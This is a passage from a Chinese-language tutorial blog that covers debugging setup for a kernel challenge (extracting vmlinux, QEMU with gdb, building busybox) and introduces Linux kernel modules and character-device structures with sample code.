prompt_">	# </span><span class="language-bash">The obscure use of the <span class="string">&quot;tr&quot;</span> filter is to work around older versions of</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash"><span class="string">&quot;grep&quot;</span> that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Try to find the header (<span class="variable">$1</span>) and decompress from here</span></span><br><span class="line">	for	pos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`</span><br><span class="line">	do</span><br><span class="line">		pos=$&#123;pos%%:*&#125;</span><br><span class="line">		tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null</span><br><span class="line">		check_vmlinux $tmp</span><br><span class="line">	done</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check invocation:</span></span><br><span class="line">me=$&#123;0##*/&#125;</span><br><span class="line">img=$1</span><br><span class="line">if	[ $# -ne 1 -o ! -s &quot;$img&quot; ]</span><br><span class="line">then</span><br><span class="line">	echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2</span><br><span class="line">	exit 2</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line">trap &quot;rm -f $tmp&quot; 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">That didn<span class="string">&#x27;t work, so retry after decompression.</span></span></span><br><span class="line">try_decompress &#x27;\037\213\010&#x27; xy    gunzip</span><br><span class="line">try_decompress &#x27;\3757zXZ\000&#x27; abcde unxz</span><br><span class="line">try_decompress &#x27;BZh&#x27;          xy    bunzip2</span><br><span class="line">try_decompress &#x27;\135\0\0\0&#x27;   xxx   unlzma</span><br><span class="line">try_decompress &#x27;\211\114\132&#x27; xy    &#x27;lzop -d&#x27;</span><br><span class="line">try_decompress &#x27;\002!L\030&#x27;   xxx   &#x27;lz4 -d&#x27;</span><br><span class="line">try_decompress &#x27;(\265/\375&#x27;   xxx   unzstd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Finally check for uncompressed images or objects:</span></span></span><br><span class="line">check_vmlinux $img</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Bail out:</span></span></span><br><span class="line">echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</span><br></pre></td></tr></table></figure></div> 运行如下命令就可以解压出 vmlinux 了。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure></div>
更快捷的方法是直接用 <code>vmlinux-to-elf</code>
解压，还可以顺便修复符号。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vmlinux-to-elf bzImage vmlinux</span><br></pre></td></tr></table></figure></div></p>
<h2 id="gdb-调试">gdb 调试</h2>
<p>首先需要对 <code>boot.sh</code> 做如下修改： - 添加
<code>nokaslr</code> 关闭地址随机化。 - 添加 <code>-s</code>，因为 qemu
其实提供了调试内核的接口，我们可以在启动参数中添加 -gdb dev
来启动调试服务。最常见的操作为在一个端口监听一个 tcp 连接。 QEMU
同时提供了一个简写的方式 -s，表示 -gdb tcp::1234，即在 1234 端口开启一个
gdbserver。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 nokaslr&#x27;</span> \</span><br><span class="line">  -enable-kvm \</span><br><span class="line">  -monitor /dev/null -m 64M \</span><br><span class="line">  --nographic \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -cpu kvm64,+smep \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure></div>
<p>为了加载 <code>babydriver.ko</code>
的符号信息，需要获取其代码段的地址。因此需要修改 <code>init</code>
内容获取 root 权限。</p>
<p>重新打包并启动系统，查询代码段地址。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2076d182b0b38f6a5f47d225d016d4f7.png"
                     
alt="在这里插入图片描述" 
                > 另外 <code>lsmod</code>
也可以查询模块加载基址。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e7b00cb989747e1f58362f34e2224339.png"
                     
alt="在这里插入图片描述" 
                > 创建 <code>gdb.sh</code> 调试脚本，
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">gdb -q \</span><br><span class="line">  -ex &quot;file $(find . -name vmlinux)&quot; \</span><br><span class="line">  -ex &quot;add-symbol-file $(find . -name babydriver.ko) 0xffffffffc0000000&quot; \</span><br><span class="line">  -ex &quot;target remote localhost:1234&quot; \</span><br><span class="line">  -ex &quot;b babyopen&quot; \</span><br><span class="line">  -ex &quot;c&quot;</span><br></pre></td></tr></table></figure></div> 运行 <code>boot.sh</code> 启动 linux ，运行
<code>gdb.sh</code> 附加到 linux，之后运行
exp，成功在断点处断下来。（注意，只有使用 root 权限启动的 gdb 才可以
vmmap 查看内存页映射情况） <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a9b8f88b5a7e5d56fdee54ec2c45b3e1.png"
                     
alt="在这里插入图片描述" 
                > ## 编译 busybox
这个不是做内核题所需的步骤，只是介绍一下内核 pwn
中的文件系统是怎么来的。因为题目提供的文件系统有相关的配置文件，因此以题目提供的文件系统为准。</p>
<p>kernel 题一般采用的是轻量化的 busybox 文件系统。</p>
<p>在<a class="link"   href="https://busybox.net/" >官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载 busybox
源码并解压。</p>
<p>之后安装依赖： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev libncursesw5-dev</span><br></pre></td></tr></table></figure></div></p>
<p>在 busybox 目录下输入如下命令进入图形界面配置编译选项。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>
<p>进入 Settings <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3b6d522ba4619e691b4fb0cfcd591140.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>选择静态编译。如果不勾选的话，需要自行配置libc库，这样步骤会很繁琐。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/6369190069fbdb7c6d09f5af41267f25.png"
                     
alt="在这里插入图片描述" 
                > 设置安装目录 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/71fe45733009242d8fdb603a12b1710d.png"
                     
alt="在这里插入图片描述" 
                > 这里我们选择的是 <code>./rootfs</code> <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/10e0b8440708ff61cee73ed24699e64b.png"
                     
alt="在这里插入图片描述" 
                > 最后保存并退出。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4e79d34af1408f9d75a62383a6f55081.png"
                     
alt="在这里插入图片描述" 
                > 编译文件 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">make -j4</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div> 可以看到生成了
<code>rootfs</code> 文件夹，这就是编译好的文件系统。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8cb0bf19e0c73e4bb3bffe8239f07caa.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h1 id="linux-内核模块">Linux 内核模块</h1>
<h2 id="什么是-lkms">什么是 LKMs</h2>
<p>LKMs
称为可加载核心模块（内核模块），其可看作是运行在内核空间的可执行程序，类似于
Linux 下的 ELF，包括：</p>
<ul>
<li>驱动程序
<ul>
<li>设备驱动</li>
<li>文件系统驱动</li>
<li>....</li>
</ul></li>
<li>内核拓展模块</li>
</ul>
<p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF ，Windows
下为 exe/dll ，mac 下为 MACH-O ，因此我们可以使用 IDA
等工具来分析内核模块。</p>
<p>模块可以被单独编译，但不能单独运行，它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程不同。</p>
<p>模块通常用来实现一种文件系统，一个驱动程序或者其它内核上层的功能。</p>
<blockquote>
<p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic
kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p>
</blockquote>
<p>通常情况下 Kernel 漏洞的发生也常见于加载的 LKMs 出现问题。 ##
相关指令 - <code>insmod</code>：将制定模块加载到内核中 -
<code>rmmod</code>：从内核中卸载制定模块 -
<code>lsmod</code>：列出已经加载的模块 -
<code>modprobe</code>：添加或删除模块，<code>modprobe</code>在加载模块时会查找依赖关系
## 文件系统
在Linux系统的视角下，无论是文件、设备、管道、还是目录，进程，甚至是磁盘，套接字等等，一切都可以被抽象成文件，一切都可以使用访问文件的方式进行操作。
图中所示为Linux中虚拟文件系统（VFS）、磁盘/Flash文件系统及一般的设备文件与设备驱动程序之间的关系。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/56602153f7522e83bf5f7ac3f41d6ecf.png"
                     
alt="在这里插入图片描述" 
                > 应用程序和 <code>VFS</code>
之间的接口是系统调用，而 <code>VFS</code>
与文件系统以及设备文件之间的接口是 <code>file_operations</code>
结构体成员函数，这个结构体包含对文件进行打开、关闭、读写、控制的一系列成员函数。
### file 结构体 <code>file</code>
结构体代表一个打开的文件，系统中每个打开的文件在内核空间都有一个关联的
<code>struct file</code>
。它由内核在打开文件时创建，并传递给在文件上进行操作的任何函数。在文件的所有实例都关闭后，内核释放这个数据结构。在内核和驱动源代码中，<code>struct file</code>
的指针通常被命名为 <code>file</code> 或 <code>filp</code> 。
<code>linux-5.17/include/linux/fs.h: file</code> <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">file</span> &#123;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">llist_node</span>	fu_llist;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">rcu_head</span> 	fu_rcuhead;</span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">path</span>		f_path;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">inode</span>		*f_inode;	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">file_operations</span>	*f_op;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="keyword">enum</span> <span class="title class_">rw_hint</span>		f_write_hint;</span><br><span class="line">	<span class="type">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> 		f_flags;</span><br><span class="line">	<span class="type">fmode_t</span>			f_mode;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">mutex</span>		f_pos_lock;</span><br><span class="line">	<span class="type">loff_t</span>			f_pos;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">fown_struct</span>	f_owner;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span>	*f_cred;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">file_ra_state</span>	f_ra;</span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="type">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">hlist_head</span>	*f_ep;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">address_space</span>	*f_mapping;</span><br><span class="line">	<span class="type">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="type">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((<span class="built_in">aligned</span>(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure></div> ###
inode结构体 VFS
inode包含文件访问权限、所有者、组、大小、生成时间、访问时间、最后修改时间等信息。它是Linux管理文件系统的最基本单位，也是文件系统连接任何子目录、文件的桥梁。
<code>include/linux/fs.h: inode</code> <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">inode</span> &#123;</span><br><span class="line">    <span class="type">umode_t</span>         i_mode; <span class="comment">// inode的权限</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>      i_opflags;</span><br><span class="line">    <span class="type">kuid_t</span>          i_uid; <span class="comment">// inode所有者的id</span></span><br><span class="line">    <span class="type">kgid_t</span>          i_gid; <span class="comment">// inode所属的群组id</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_flags;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">dev_t</span>           i_rdev; <span class="comment">// 若是设备文件，此字段将记录设备的设备号</span></span><br><span class="line">    <span class="type">loff_t</span>          i_size; <span class="comment">// inode所代表的文件大小</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">timespec</span>     i_atime; <span class="comment">// inode最近一次的存取时间</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">timespec</span>     i_mtime; <span class="comment">// inode最近一次的修改时间</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">timespec</span>     i_ctime; <span class="comment">// inode的产生时间</span></span><br><span class="line">    <span class="type">spinlock_t</span>      i_lock; <span class="comment">/* i_blocks, i_bytes, maybe i_size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>          i_bytes;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_blkbits;</span><br><span class="line">    <span class="type">blkcnt_t</span>        i_blocks; <span class="comment">// inode所使用的block数，一个block为512字节</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>  *i_pipe;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">block_device</span> *i_bdev; <span class="comment">// 若是块设备，为其对应的block_device结构体指针</span></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">cdev</span>     *i_cdev; <span class="comment">// 若是字符设备，为其对应的cdev结构体指针</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div> 查看
<code>/proc/devices</code>
文件可以获知系统中注册的设备，第一列为主设备号，第二列为设备名：
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /proc/devices</span></span><br><span class="line">Character devices:</span><br><span class="line">  1 mem</span><br><span class="line">  4 /dev/vc/0</span><br><span class="line">  4 tty</span><br><span class="line">  4 ttyS</span><br><span class="line">  5 /dev/tty</span><br><span class="line">  5 /dev/console</span><br><span class="line">  5 /dev/ptmx</span><br><span class="line">  ...</span><br><span class="line">Block devices:</span><br><span class="line">259 blkext</span><br><span class="line">  7 loop</span><br><span class="line">  8 sd</span><br><span class="line">  9 md</span><br><span class="line"> 11 sr</span><br><span class="line"> 65 sd</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure></div> 查看 <code>/dev</code>
目录可以获知系统中包含的设备文件，日期前的两列对应设备的主设备号和次设备号：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -al /dev</span></span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x    8 root     root          2940 May  8 14:17 .</span><br><span class="line">drwxr-xr-x   11 root     root             0 May  8 14:18 ..</span><br><span class="line">drwxr-xr-x    2 root     root            60 May  8 14:17 bsg</span><br><span class="line">crw-rw----    1 root     root        5,   1 May  8 14:17 console</span><br></pre></td></tr></table></figure></div>
<p>主设备号是与驱动对应的概念，同一类设备一般用相同的主设备号，不同类设备的主设备号一般不同。
## 内核模块开发 ### Hello World模块 编写一个输出内容的<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/LKMs_test/ko_test" >内核模块 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>首先在内核源码目录下创建一个用于编译内核模块的文件夹，这里我创建的文件夹的名称是
<code>myko</code> 。 在该目录下创建 <code>myko.c</code> ，内容如下：
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MODULE_LICENSE</span>(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;Hello, world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;Goodbye, cruel world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module_init</span>(hello_init);</span><br><span class="line"><span class="built_in">module_exit</span>(hello_exit);</span><br></pre></td></tr></table></figure></div> -
<code>linux/module.h</code>是<code>Linux</code>内核模块变成必须包含的头文件</p>
<ul>
<li>头文件<code>kernel.h</code>包含了常用的内核函数</li>
<li>头文件<code>init.h</code>包含了宏<code>_init</code>和<code>_exit</code>,它们允许释放内核占用的内存。</li>
<li><code>hello_init</code>函数是模块初始化函数，他会在内核模块被加载的时候执行，使用<code>__init</code>进行修饰，一般用它来初始化数据结构等内容；</li>
<li><code>hello_exit</code>函数是模块的退出函数，他会在模块在退出的时候执行。</li>
<li>函数<code>module_init()</code>和<code>clearnup_exit()</code>是模块编程中最基本也是必须得两个函数，它用来指定模块加载和退出时调用的函数，这里加载的是我们上面定义好的两个函数，<code>module_init()</code>向内核注册模块提供新功能，而<code>cleanup_exit()</code>注销由模块提供的所用功能。</li>
<li>这段代码中使用了<code>printk</code>函数，这是内核打印函数，可以使用<code>dmesg</code>指令来看到内核打印信息。</li>
</ul>
<p>创建 <code>Makefile</code> ，内容如下：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := myko.o</span><br><span class="line"></span><br><span class="line">KERNELDR := ~/Desktop/linux-5.17/</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">moduels_install:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure></div>
<p>编译 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a577482dda67724b83501acf6c9c1e47.png"
                     
alt="在这里插入图片描述" 
                > 生成 <code>myko.ko</code> 驱动 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c3827c08733ff1c1e483b68a7219a30c.png"
                     
alt="在这里插入图片描述" 
                > 参考<a class="link" 
 href="https://sky123.blog.csdn.net/article/details/124501391" >环境搭建 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，将其打包到文件系统中，然后启动系统。</p>
<p>可以看到，模块运行正常。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2b833dffac355164909bec5817f96202.png"
                     
alt="在这里插入图片描述" 
                > ### 带参数的模块 <code>myko.c</code>
内容修改为：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MODULE_LICENSE</span>(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *whom = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> howmany = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">module_param</span>(howmany, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"><span class="built_in">module_param</span>(whom, charp, S_IRUGO);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; howmany; i++)</span><br><span class="line">        <span class="built_in">printk</span>(<span class="string">&quot;(%d) Hello, %s\n&quot;</span>, i, whom);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;Goodbye, cruel world\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module_init</span>(hello_init);</span><br><span class="line"><span class="built_in">module_exit</span>(hello_exit);</span><br></pre></td></tr></table></figure></div>
<p>参数必须使用<code>module_param</code>宏来声明，这个宏在<code>moduleparam.h</code>中定义。<code>module_param</code>需要三个参数：变量的名称、类型以及用于<code>sysfs</code>入口项的访问许可掩码，这个宏必须放在任何函数之外，通常在源文件头部。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2d026a01540a830c1dc2709f61f097bd.png"
                     
alt="在这里插入图片描述" 
                > ## 字符设备驱动 ### 字符设备驱动结构 ####
cdev 结构体 <code>cdev</code> 为 linux 描述字符设备的一个结构。
<code>include/linux/cdev.h</code> <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cdev</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">kobject</span> kobj;         <span class="comment">// 内嵌的kobject对象</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">module</span> *owner;        <span class="comment">// 所属模块</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">file_operations</span> *ops; <span class="comment">// 文件操作结构体</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">list_head</span> list;</span><br><span class="line">    <span class="type">dev_t</span> dev;                   <span class="comment">// 设备号</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <code>dev_t</code>
定义了设备号，为 32 位，其中 12 位为主设备号，20
位为次设备号。下面的宏可以获得主设备号和次设备号： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">MAJOR</span>(<span class="type">dev_t</span> dev)</span><br><span class="line"><span class="built_in">MINOR</span>(<span class="type">dev_t</span> dev)</span><br></pre></td></tr></table></figure></div>
使用下面的宏可以用主设备号和次设备号生成 dev_t ： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">MKDEV</span>(<span class="type">int</span> major, <span class="type">int</span> minor)</span><br></pre></td></tr></table></figure></div> Linux
内核提供了一组函数用于操作 <code>cdev</code> 结构体： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="keyword">struct</span> file_operations *)</span></span>; <span class="comment">// 用于初始化cdev的成员，并建立cdev和file_operations之间的连接</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">cdev</span> *<span class="built_in">cdev_alloc</span>(<span class="type">void</span>); <span class="comment">// 用于动态申请一个cdev内存</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cdev_put</span><span class="params">(<span class="keyword">struct</span> cdev *p)</span></span>;</span><br><span class="line"><span class="comment">// 用向系统添加和删除一个cdev，完成字符设备的注册和注销</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="type">dev_t</span>, <span class="type">unsigned</span>)</span></span>; <span class="comment">// 通常在字符设备驱动模块加载函数中调用</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cdev_del</span><span class="params">(<span class="keyword">struct</span> cdev *)</span></span>; <span class="comment">// 字符设备驱动模块卸载函数中调用</span></span><br></pre></td></tr></table></figure></div>
在调用 <code>cdev_add()</code> 函数向系统注册字符设备之前，应首先调用
<code>register_chrdev_region()</code> 或
<code>alloc_chrdev_region()</code> 函数向系统申请设备号： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">register_chrdev_region</span><span class="params">(<span class="type">dev_t</span> from, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">alloc_chrdev_region</span><span class="params">(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)</span></span>;</span><br></pre></td></tr></table></figure></div>
<code>register_chrdev_region()</code>
函数用于已知起始设备的设备号的情况，而
<code>alloc_chrdev_region()</code>
用于设备号未知，向系统动态申请未被占用的设备号的情况。 ####
file_operations 结构体 <code>file_operations</code>
结构体中的成员函数是字符设备驱动程序设计的主体内容，这些函数实际会在应用程序进行
Linux 的 <code>open()</code> 、<code>write()</code>
、<code>read()</code> 、<code>close()</code>
等系统调用时最终被内核调用。
